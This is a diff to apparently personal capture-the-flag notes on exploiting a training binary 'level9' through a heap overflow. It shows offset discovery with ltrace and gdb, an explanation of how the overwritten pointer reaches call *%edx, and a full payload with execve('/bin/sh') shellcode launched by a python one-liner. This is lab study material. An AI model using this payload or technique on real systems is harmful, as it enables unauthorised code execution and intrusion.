@@ -27,24 +27,25 @@
  
 
  
- > ltrace ./level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
-strlen("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...) = 150
-memcpy(0x0804a00c, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"..., 150) = 0x0804a00c # We have buffer address
+ > ltrace ./level9 aaaaa
+strlen("aaaaa") = 5
+memcpy(0x0804a00c, "aaaaa", 5) = 0x0804a00c # We have buffer address
 
 eax	Accumulateur	Sert aux opérations mathématiques mais aussi à la transmission des numéros de fonctions à appeler lorsqu'on se sert de l'interruption système 0x80 et au renvoi des résultats dans les fonctions (que nous aborderons au Chapitre 3). Lorsque vous devez utiliser un registre pour une opération quelconque et que vous ne savez pas lequel utiliser, privilégiez celui-ci — c'est le plus optimisé au niveau de la rapidité d'exécution des opérations.
  # We find the offset for eax (first arg)
+gdb --> put breakpoint just before auiting the program
 (gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
 (gdb) info register eax
 eax 0x41366441	1094083649
  # So offset calculator give 108
  
- # WHAT DA PAYLOAD DO: Overflow until we have reach eax content, we fill it with addr of what we cpy in memcpy, SO when the program run
- when it arrive to main+159:	call   *%edx, eax content has been stored in edx, so the instrution <call *> will read edx 4 first bytes (adress poining to the shellcode)
- and use it as a GOT pointer, so it will execute the code stored at the adresse we give in first to our payload
+ # WHAT DA PAYLOAD DO: Overflow until we have reach the return of the class function witch fill eax content in main, we fill it with addr of what we cpy in memcpy, then eax take the value of what is stored
+  by the memcpy ([adress pointing 4 bytes after][shellcode]) then edx take the value of the 4 first bytes in eax ([adress pointing 4 bytes after --> the shellcode]), then call is used on edx
+ executing the code pointed by the adress (our shellcode)
  
  # DA PAYLOAD
  "\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "a" * 83 + "\x0c\xa0\x04\x08"
- [memcpy adress deref]+[shellcode level2 21 bytes]+[padding jusqua 108]+[addr buffer]
+ [memcpy adress + 4]+[shellcode level2 21 bytes]+[padding jusqua 108]+[addr buffer]
  
  ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "a" * 83 + "\x0c\xa0\x04\x08"'
 > )
